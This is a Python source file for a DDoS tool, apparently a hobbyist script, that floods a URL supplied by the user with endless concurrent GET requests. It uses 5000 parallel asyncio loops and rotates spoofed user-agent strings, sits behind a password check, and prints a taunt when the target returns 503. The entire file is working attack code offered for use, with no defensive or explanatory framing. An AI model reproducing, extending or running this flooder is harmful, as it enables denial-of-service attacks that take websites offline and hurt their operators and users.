import aiohttp
import asyncio
import os
import importlib
import getpass
import time
import sys
import random

headers_useragents = []

def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')

useragent_list()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def animated_welcome_message():
    message = """
\033[31m
  Ｗｅｌｃｏｍｅ ｔｏ ｍｙ ＤＤｏＳ ｔｏｏｌ
\033[0m
    """
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.02)
    time.sleep(1)
clear_screen()
animated_welcome_message()
clear_screen()

print("""
\033[31m▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                          
                            Version 2.1
\033[0m
\033[31mCreated by Joshua Apostol\n\033[0m
\033[31mPlease do not attack gov or edu website thankyou!!!\033[0m
""")

password_module = importlib.import_module('password')

total_requests = 1000000
requests_per_second = 5000

async def attack(target_url):
    try:
        async with aiohttp.ClientSession() as session:
            while True:
                headers = {'User-Agent': random.choice(headers_useragents)}
                async with session.get(target_url, headers=headers) as response:
                    if response.status == 503:
                        print("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣")
                    elif response.status == 200:
                        print("Website still up.")
                    else:
                        print(f"Unexpected status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Client error: {e}")
    except asyncio.TimeoutError:
        print("Request timed out")
    except Exception as e:
        print(f"Unexpected error: {e}")

async def main(target_url):
    await asyncio.gather(*[attack(target_url) for _ in range(requests_per_second)])

if __name__ == "__main__":
    input_password = getpass.getpass("Enter the password: ")
    if input_password == password_module.PASSWORD:
        target_url = input("Enter the URL to attack: ")
        asyncio.run(main(target_url))
    else:
        print("Incorrect password. Access denied.")
